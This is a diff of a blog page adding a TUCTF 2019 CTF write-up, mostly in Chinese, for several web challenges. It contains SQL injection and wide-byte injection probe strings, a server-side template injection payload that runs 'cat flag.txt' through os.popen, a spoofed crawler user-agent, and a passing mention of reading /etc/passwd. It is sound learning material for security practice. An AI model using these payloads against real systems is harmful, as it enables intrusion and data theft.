@@ -66,6 +66,109 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-tuctf" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2019/11/30/tuctf/" class="article-date">
+  <time class="dt-published" datetime="2019-11-30T12:25:26.222Z" itemprop="datePublished">2019-11-30</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2019/11/30/tuctf/">tuctf2019</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="tuctf2019"><a href="#tuctf2019" class="headerlink" title="tuctf2019"></a>tuctf2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="Router-Where-Art-Thou"><a href="#Router-Where-Art-Thou" class="headerlink" title="Router Where Art Thou?"></a>Router Where Art Thou?</h3><p> <a href="http://chal.tuctf.com:30006/0.html" target="_blank" rel="noopener">http://chal.tuctf.com:30006/0.html</a> </p>
+<p> <a href="http://chal.tuctf.com:30006/1.html" target="_blank" rel="noopener">http://chal.tuctf.com:30006/1.html</a></p>
+<p> <a href="http://chal.tuctf.com:30006/2.html" target="_blank" rel="noopener">http://chal.tuctf.com:30006/2.html</a>  </p>
+<p><code>FIXME: need to use Page::includeStaticResource</code></p>
+<p><code>2.html:603  hidden variables, we are going to set this to the session, bug fix 2157</code></p>
+<p><a href="https://192.168.1.254/" target="_blank" rel="noopener">https://192.168.1.254/</a></p>
+<p>….爆破密码获得flag</p>
+<h3 id="Login-to-Access"><a href="#Login-to-Access" class="headerlink" title="Login to Access"></a>Login to Access</h3><p>当Referer不为<a href="http://chal.tuctf.com:30001/login.html时,存在sql注入" target="_blank" rel="noopener">http://chal.tuctf.com:30001/login.html时,存在sql注入</a></p>
+<p>当Referer: <a href="http://chal.tuctf.com:30001/login.hmtl时sql" target="_blank" rel="noopener">http://chal.tuctf.com:30001/login.hmtl时sql</a> 注入被过滤</p>
+<p>对第一种情况sql注入得到</p>
+<pre><code class="python">#database:information_schema,challenge,mysql,performance_schema,sys 
+#table:users
+#columns:user,password,USER,CURRENT_CONNECTIONS,TOTAL_CONNECTIONS
+#user,password,USER : dave,hunter2,dave</code></pre>
+<p>利用得到的账号密码直接在第二步登陆无效,猜测第二步还要sql注入</p>
+<ul>
+<li>sql注入</li>
+</ul>
+<pre><code class="python">dave&#39;+or+1%23 x
+dave&quot;+or+1%23 x
+dave&quot;)+or+1%23 x
+dave&#39;)+or+1%23 x
+\转义&#39;或&quot;来逃逸失败
+
+</code></pre>
+<p>宽字节注入:</p>
+<pre><code class="python">#username=%2bsleep(10)&amp;password=%bf%5c&quot; x
+#username=%2bsleep(10)&amp;password=%bf%5c&#39; x
+#username=%bf%5c&quot;&amp;password=%2bsleep(10) x
+#username=%bf%5c&#39;&amp;password=%2bsleep(10) x</code></pre>
+<p>sql注入点时username还是password</p>
+<p>是单引号还是双引号闭合</p>
+<p>过滤了哪些字符，转义了哪些字符</p>
+<p>We then looked at the challenge’s description again and realized that there might be backup of file somewhere. We then tried to get the <strong>login.php.bak</strong>.</p>
+<p><img src="https://khroot.com/wp-content/uploads/2019/11/image-201.png" alt="img"></p>
+<p>Surprise, there really is a backup file there. Let’s see what is inside.</p>
+<p><img src="https://khroot.com/wp-content/uploads/2019/11/image-202-1024x385.png" alt="img"></p>
+<p>We found the flag, and it is <code>TUCTF{b4ckup5_0f_php?_1t5_m0r3_c0mm0n_th4n_y0u_th1nk}</code></p>
+<h3 id="The-Droid-You’re-Looking-For"><a href="#The-Droid-You’re-Looking-For" class="headerlink" title="The Droid You’re  Looking For"></a>The Droid You’re  Looking For</h3><p>看到droid想到robots.txt,直接访问提示没有权限</p>
+<p>因为robots.txt是给爬虫看的,所以去百度了一个google爬虫的user-agent:</p>
+<pre><code>Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1;</code></pre><p>robots.txt</p>
+<pre><code>User-agent: *
+Disallow: googleagentflagfoundhere.html</code></pre><p>TUCTF{463nt_6006l3_r3p0rt1n6_4_r0b0t}</p>
+<h3 id="And-Now-For-Something-Completely-Different"><a href="#And-Now-For-Something-Completely-Different" class="headerlink" title="And Now, For Something Completely Different"></a>And Now, For Something Completely Different</h3><pre><code class="python">Traceback (most recent call last):
+  File &quot;/usr/local/lib/python2.7/dist-packages/tornado/web.py&quot;, line 1509, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File &quot;/usr/src/app/class_website.py&quot;, line 87, in post
+    if len(name) == 0 or len(phone_num) == 0 or len(email) == 0 or len(passwd2) == 0 or passw != passw2:
+NameError: global name &#39;passwd2&#39; is not defined</code></pre>
+<p>在网页中发现</p>
+<pre><code class="html">&lt;!-- TODO: add /welcome/test --&gt;</code></pre>
+<p>打开只有welcome test &lt;==&gt; /welcome/test</p>
+<p>猜测是ssti</p>
+<pre><code>{{__import__('os').popen('cat flag.txt').read()}}</code></pre><p> TUCTF{4lw4y5_60_5h0pp1n6_f0r_fl465} </p>
+<h3 id="Cute-Animals-Company"><a href="#Cute-Animals-Company" class="headerlink" title="Cute Animals Company"></a>Cute Animals Company</h3><p>修改cookie获得登陆权限</p>
+<p>sqlmap得到密码</p>
+<p>file:///etc/passwd获得flag???</p>
+<p>http访问都不行的呀</p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2019/11/30/tuctf/">http://blog.ccreater.top/2019/11/30/tuctf/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2019/11/30/tuctf/" data-id="ck98hcpvw000elcv04waj0fex" data-title="tuctf2019" class="article-share-link">Share</a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-unctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2019/10/25/unctf2019/" class="article-date">
@@ -922,6 +1025,10 @@ while True:
       <ul>
         
           <li>
+            <a href="/2020/05/06/de1ctf2020/">de1ctf2020</a>
+          </li>
+        
+          <li>
             <a href="/2020/05/05/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">maven学习笔记</a>
           </li>
         
@@ -935,10 +1042,6 @@ while True:
         
           <li>
             <a href="/2020/04/20/byb2019%E7%BA%BF%E4%B8%8Bawd/">百越杯总结</a>
-          </li>
-        
-          <li>
-            <a href="/2020/04/20/bytectfwp/">bytectf wp</a>
           </li>
         
       </ul>
